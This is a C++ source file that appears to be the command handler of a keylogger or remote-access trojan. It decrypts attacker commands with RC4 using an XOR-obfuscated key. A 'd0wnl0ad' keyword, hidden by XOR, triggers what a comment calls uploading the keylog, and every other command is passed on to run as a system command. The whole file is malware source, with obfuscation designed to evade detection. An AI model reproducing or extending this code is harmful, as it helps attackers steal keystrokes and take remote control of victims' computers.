#include "cmder.hpp"

std::string xecodeMsg(std::string xmsg)
{
    char cpk[31];

    strncpy(cpk, INET_KEY, sizeof(cpk));
    unxor(cpk);

    std::string key(cpk);

    xRC4 r(key);

    std::string res;
    std::string cmd = r.decrypt(xmsg);
    size_t pos;
    while ((pos = cmd.find('$')) != -1)
    {
        // cout << s.substr(0, end) << endl;
        // s.erase(s.begin(), s.begin() + end + 1);
        // std::cout << cmd.substr(0, pos) << std::endl;
        res += cmd.substr(0, pos) + " ";
        cmd.erase(cmd.begin(), cmd.begin() + pos + 1);
    }

    return res;
}

std::pair<CMDSTATE, RECVDATA> handleCommands(std::string cmd)
{
    std::string xCmd = xecodeMsg(cmd);

    std::pair<CMDSTATE, RECVDATA> res;

    // "d0wnl0ad "
    char download[] = "\x64\x31\x75\x6d\x68\x35\x67\x63\x28";
    unxor(download);

    if (xCmd == download)
    {
        // std::cout << "Start uploading keylog !" << std::endl;
        res = std::make_pair(CUSTCMD, download);
    }
    else
    {
        res = std::make_pair(SYSCMD, xCmd);
    }

    return res;
}